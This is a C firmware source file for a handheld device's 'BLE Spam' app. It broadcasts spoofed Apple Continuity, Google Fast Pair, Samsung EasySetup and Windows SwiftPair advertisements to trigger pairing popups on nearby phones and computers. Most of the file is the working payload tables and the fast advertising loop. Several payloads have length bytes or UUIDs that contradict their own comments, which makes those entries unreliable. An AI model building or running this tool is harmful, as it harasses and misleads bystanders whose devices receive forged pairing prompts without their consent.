/* See COPYING.txt for license details. */

/*
 * app_ble_spam.c
 *
 * BLE Spam: cycles crafted BLE advertising payloads to trigger proximity-pairing
 * popups on nearby phones and devices (Apple Continuity, Google Fast Pair,
 * Samsung EasySetup, Windows SwiftPair).
 *
 * Uses the ESP32-C6 in BLE broadcaster mode (AT+BLEINIT=2) and sends raw
 * advertising data via AT+BLEADVDATA.  Does NOT require a BLE connection.
 *
 * Menu structure:
 *   BLE Spam
 *     Apple (all Continuity types, cycling)
 *     Google Fast Pair
 *     Samsung EasySetup
 *     Windows SwiftPair
 *     All (random cycle across all vendors)
 *
 * Navigation: UP/DOWN = select mode, ENTER/RIGHT = start, BACK = exit
 */

#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include "stm32h5xx_hal.h"
#include "main.h"
#include "app_ble_spam.h"
#include "m1_compile_cfg.h"
#include "m1_display.h"
#include "m1_lcd.h"
#include "m1_system.h"
#include "m1_esp32_hal.h"
#include "esp_app_main.h"
#include "app_freertos.h"
#include "cmsis_os.h"

#ifdef M1_APP_BLE_SPAM_ENABLE

/* --------------------------------------------------------------------------
 * BLE advertising payload tables
 *
 * Each hex string is the complete ADV_IND payload (max 31 bytes = 62 hex
 * chars) passed directly to AT+BLEADVDATA="<hex>".
 *
 * Format reference (BLE AD structure, little-endian):
 *   02 01 XX       - Flags AD   (len=2, type=01, value)
 *   LL FF CC CC    - Manufacturer Specific AD  (len=LL, type=FF, company LE)
 *
 * Apple Continuity (company 0x004C):
 *   FF 4C 00 TT NN [NN bytes...]
 *   TT = Continuity type, NN = payload length
 *
 * Google Fast Pair (service UUID 0xFE2C):
 *   03 03 2C FE    - Complete 16-bit UUID list
 *   06 16 2C FE MM MM MM  - Service Data with 3-byte model ID
 *
 * Samsung EasySetup (company 0x0075):
 *   FF 75 00 42 09 [device class byte] [flags...]
 *
 * Windows SwiftPair (company 0x0006):
 *   FF 06 00 03 00 [subtype] [name length] [name bytes...]
 * -------------------------------------------------------------------------- */

typedef struct {
    const char *label;   /* shown on display (max ~14 chars) */
    const char *hex;     /* uppercase hex, even length, max 62 chars */
} spam_pkt_t;

/* ---- Apple Continuity ---- */
/* type 0x07 = AirPods Nearby Pairing (triggers "Connect AirPods" popup on iOS) */
/* type 0x05 = AirPods Pro nearby                                                */
/* type 0x0F = iPhone Nearby Action (triggers device-activity pill)             */
/* type 0x08 = Apple TV Setup                                                   */
/* type 0x0B = Apple Watch setup                                                */
/* type 0x12 = AirTag proximity (FindMy)                                        */
/* type 0x09 = Apple TV color picker                                            */
/* Payload layout: 02 01 1A | LL FF 4C 00 | TT NN | <NN bytes>                 */
/* 0x1A=26: FF(1)+4C(2)+00(3)+TT(4)+NN(5)+data(21) = 26 ✓                     */
static const spam_pkt_t s_apple[] = {
    {
        "AirPods Gen1",
        "02011A"                    /* Flags */
        "1AFF4C00"                  /* Apple Mfr, len=26 */
        "0713"                      /* type=AirPods, datalen=19 */
        "010020AA20000000002C55"
        "000000000000000000"
    },
    {
        "AirPods Pro",
        "02011A"
        "1AFF4C00"
        "0713"
        "010020E02000000000002C55"
        "0000000000000000"
    },
    {
        "AirPods Max",
        "02011A"
        "1AFF4C00"
        "0713"
        "01002C0A0000000000002C55"
        "0000000000000000"
    },
    {
        "AirTag",
        "02011A"
        "17FF4C00"                  /* Apple Mfr, len=23 */
        "1219"                      /* type=AirTag, datalen=25 - but truncated to 23 */
        "0000000000000000000000000000000000000000000000"
    },
    {
        "iPhone Near",
        "02011A"
        "0EFF4C00"                  /* len=14 */
        "0F05"                      /* type=iPhone Nearby, datalen=5 */
        "C1010000000000"
    },
    {
        "Apple Watch",
        "02011A"
        "0AFF4C00"                  /* len=10 */
        "0B05"                      /* type=Watch, datalen=5 */
        "01180000000000"
    },
    {
        "Apple TV",
        "02011A"
        "06FF4C00"                  /* len=6 */
        "0804"                      /* type=AppleTV setup, datalen=4 */
        "00000000"
    },
    {
        "AirDrop",
        "02011A"
        "1AFF4C00"
        "1219"
        "0000000000000000000000000000000000000000000000"
    },
};

/* ---- Google Fast Pair ---- */
/* Service UUID 0xFE2C, 3-byte model ID (big-endian in Fast Pair spec) */
/* Documented model IDs from Google's Fast Pair registry                */
static const spam_pkt_t s_google[] = {
    { "Pixel Buds A",   "020106030320FE0616FE2C2C103B" },
    { "Pixel Buds Pro", "020106030320FE0616FE2C60ED06" },
    { "Pixel Watch",    "020106030320FE0616FE2CE03006" },
    { "Nest Mini",      "020106030320FE0616FE2C44C8D1" },
    { "Pixel C200",     "020106030320FE0616FE2C0000F0" },
};

/* ---- Samsung EasySetup ---- */
/* Company 0x0075, EasySetup TLV: type=0x42, sub=0x09, device class */
static const spam_pkt_t s_samsung[] = {
    {
        "Galaxy Buds",
        "02011A"
        "14FF7500"                  /* Samsung Mfr, len=20 */
        "4209A803"                  /* EasySetup type/sub/class */
        "00000000000000000000000000000000"
    },
    {
        "Galaxy Watch",
        "02011A"
        "14FF7500"
        "420993030000000000000000000000000000"
    },
    {
        "Galaxy S22",
        "02011A"
        "14FF7500"
        "42090B030000000000000000000000000000"
    },
};

/* ---- Windows SwiftPair ---- */
/* Company 0x0006 (Microsoft), SwiftPair subtype 0x03, complete local name follow */
static const spam_pkt_t s_windows[] = {
    {
        "BT Keyboard",
        "020106"
        "031900020A09"
        "0EFF060003000902"
    },
    {
        "BT Mouse",
        "020106"
        "031902040A09"
        "0CFF060003000202"
    },
};

/* ---- Mode descriptors ---- */
#define N_APPLE    (sizeof(s_apple)   / sizeof(s_apple[0]))
#define N_GOOGLE   (sizeof(s_google)  / sizeof(s_google[0]))
#define N_SAMSUNG  (sizeof(s_samsung) / sizeof(s_samsung[0]))
#define N_WINDOWS  (sizeof(s_windows) / sizeof(s_windows[0]))

typedef struct {
    const char        *mode_name;
    const spam_pkt_t  *pkts;
    uint8_t            count;
} spam_mode_t;

static const spam_mode_t s_modes[] = {
    { "Apple Cont.",  s_apple,   N_APPLE   },
    { "Google FP",    s_google,  N_GOOGLE  },
    { "Samsung ES",   s_samsung, N_SAMSUNG },
    { "Windows SP",   s_windows, N_WINDOWS },
    { "All Vendors",  NULL,      0         }, /* NULL = cycle all */
};
#define N_MODES  (sizeof(s_modes) / sizeof(s_modes[0]))

/* --------------------------------------------------------------------------
 * AT command helpers (thin wrappers around spi_AT_send_recv)
 * -------------------------------------------------------------------------- */
#define AT_TIMEOUT_S   3

static char s_at_resp[128];

static inline void spam_at(const char *cmd)
{
    spi_AT_send_recv(cmd, s_at_resp, sizeof(s_at_resp), AT_TIMEOUT_S);
}

/* --------------------------------------------------------------------------
 * BLE broadcaster lifecycle
 * -------------------------------------------------------------------------- */

static bool s_ble_spam_active = false;

static bool spam_ble_init(void)
{
    spam_at("AT+BLEINIT=0\r\n");           /* ensure clean state */
    vTaskDelay(pdMS_TO_TICKS(100));
    spam_at("AT+BLEINIT=2\r\n");           /* broadcaster role (no connection) */
    vTaskDelay(pdMS_TO_TICKS(100));
    /* Fast non-connectable undirected advertising: min=32(20ms), max=64(40ms),
     * type=3 (non-connectable), own_addr=0, ch_map=7, filter=0             */
    spam_at("AT+BLEADVPARAM=32,64,3,0,7,0\r\n");
    vTaskDelay(pdMS_TO_TICKS(50));
    s_ble_spam_active = false;
    return true;
}

static void spam_ble_deinit(void)
{
    if (s_ble_spam_active) {
        spam_at("AT+BLEADVSTOP\r\n");
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    spam_at("AT+BLEINIT=0\r\n");
    s_ble_spam_active = false;
}

static void spam_send_payload(const char *hex)
{
    char cmd[72];
    if (s_ble_spam_active) {
        spam_at("AT+BLEADVSTOP\r\n");
        vTaskDelay(pdMS_TO_TICKS(30));
    }
    snprintf(cmd, sizeof(cmd), "AT+BLEADVDATA=\"%s\"\r\n", hex);
    spam_at(cmd);
    vTaskDelay(pdMS_TO_TICKS(30));
    spam_at("AT+BLEADVSTART\r\n");
    s_ble_spam_active = true;
}

/* --------------------------------------------------------------------------
 * Display helpers
 * -------------------------------------------------------------------------- */

static void draw_header(const char *title)
{
    u8g2_SetFont(&m1_u8g2, M1_DISP_MAIN_MENU_FONT_N);
    u8g2_DrawStr(&m1_u8g2, 0, 11, title);
    u8g2_DrawHLine(&m1_u8g2, 0, 13, 128);
}

static void draw_menu(uint8_t sel)
{
    m1_u8g2_firstpage();
    draw_header("BLE Spam");
    for (uint8_t i = 0; i < N_MODES; i++) {
        uint8_t y = 24 + i * 10;
        if (i == sel) {
            u8g2_DrawBox(&m1_u8g2, 0, y - 8, 128, 10);
            u8g2_SetDrawColor(&m1_u8g2, M1_DISP_DRAW_COLOR_BG);
        }
        u8g2_DrawStr(&m1_u8g2, 2, y, s_modes[i].mode_name);
        if (i == sel)
            u8g2_SetDrawColor(&m1_u8g2, M1_DISP_DRAW_COLOR_TXT);
    }
    m1_u8g2_nextpage();
}

static void draw_running(const char *mode, const char *pkt_label, uint32_t count)
{
    char cnt_str[12];
    snprintf(cnt_str, sizeof(cnt_str), "#%lu", (unsigned long)count);
    m1_u8g2_firstpage();
    draw_header(mode);
    u8g2_DrawStr(&m1_u8g2, 2, 26, pkt_label);
    u8g2_DrawStr(&m1_u8g2, 2, 38, cnt_str);
    u8g2_DrawStr(&m1_u8g2, 2, 55, "[BACK] Stop");
    m1_u8g2_nextpage();
}

/* --------------------------------------------------------------------------
 * Spam loop
 * -------------------------------------------------------------------------- */

/* Interleaved all-vendor table for "All Vendors" mode */
static const spam_pkt_t *all_pkts_ptr(uint8_t idx)
{
    if (idx < N_APPLE)                          return &s_apple[idx];
    idx -= N_APPLE;
    if (idx < N_GOOGLE)                         return &s_google[idx];
    idx -= N_GOOGLE;
    if (idx < N_SAMSUNG)                        return &s_samsung[idx];
    idx -= N_SAMSUNG;
    if (idx < N_WINDOWS)                        return &s_windows[idx];
    return NULL;
}
#define N_ALL  (N_APPLE + N_GOOGLE + N_SAMSUNG + N_WINDOWS)

static void run_spam_mode(uint8_t mode_idx)
{
    S_M1_Buttons_Status btn;
    S_M1_Main_Q_t       q_item;
    const spam_mode_t  *m    = &s_modes[mode_idx];
    bool                all  = (m->pkts == NULL);
    uint8_t             pidx = 0;
    uint8_t             total = all ? (uint8_t)N_ALL : m->count;
    uint32_t            count = 0;

    if (!spam_ble_init()) return;

    while (1) {
        const spam_pkt_t *pkt = all ? all_pkts_ptr(pidx) : &m->pkts[pidx];
        if (!pkt) { pidx = 0; continue; }

        spam_send_payload(pkt->hex);
        count++;

        draw_running(m->mode_name, pkt->label, count);

        /* Dwell 250 ms per payload, then rotate */
        vTaskDelay(pdMS_TO_TICKS(250));

        pidx = (pidx + 1) % total;

        /* Non-blocking check for BACK */
        if (xQueueReceive(main_q_hdl, &q_item, 0) == pdTRUE) {
            if (q_item.q_evt_type == Q_EVENT_KEYPAD) {
                if (xQueueReceive(button_events_q_hdl, &btn, 0) == pdTRUE) {
                    if (btn.event[BUTTON_BACK_KP_ID] == BUTTON_EVENT_CLICK ||
                        btn.event[BUTTON_LEFT_KP_ID] == BUTTON_EVENT_CLICK)
                        break;
                }
            }
        }
    }

    spam_ble_deinit();
}

/* --------------------------------------------------------------------------
 * Main entry point
 * -------------------------------------------------------------------------- */

void ble_spam_run(void)
{
    S_M1_Buttons_Status btn;
    S_M1_Main_Q_t       q_item;
    uint8_t             sel = 0;

    /* Ensure ESP32 is up */
    if (!m1_esp32_get_init_status())    m1_esp32_init();
    if (!get_esp32_main_init_status())  esp32_main_init();
    if (!get_esp32_main_init_status()) {
        m1_message_box(&m1_u8g2, "BLE Spam", "ESP32 not", "ready", " OK ");
        return;
    }

    draw_menu(sel);

    while (1) {
        if (xQueueReceive(main_q_hdl, &q_item, portMAX_DELAY) != pdTRUE) continue;
        if (q_item.q_evt_type != Q_EVENT_KEYPAD) continue;
        if (xQueueReceive(button_events_q_hdl, &btn, 0) != pdTRUE) continue;

        if (btn.event[BUTTON_UP_KP_ID] == BUTTON_EVENT_CLICK) {
            if (sel > 0) sel--;
            draw_menu(sel);
        } else if (btn.event[BUTTON_DOWN_KP_ID] == BUTTON_EVENT_CLICK) {
            if (sel < N_MODES - 1) sel++;
            draw_menu(sel);
        } else if (btn.event[BUTTON_OK_KP_ID]    == BUTTON_EVENT_CLICK ||
                   btn.event[BUTTON_RIGHT_KP_ID] == BUTTON_EVENT_CLICK) {
            run_spam_mode(sel);
            draw_menu(sel);           /* redraw after returning */
        } else if (btn.event[BUTTON_BACK_KP_ID]  == BUTTON_EVENT_CLICK ||
                   btn.event[BUTTON_LEFT_KP_ID]  == BUTTON_EVENT_CLICK) {
            break;
        }
    }
}

#endif /* M1_APP_BLE_SPAM_ENABLE */
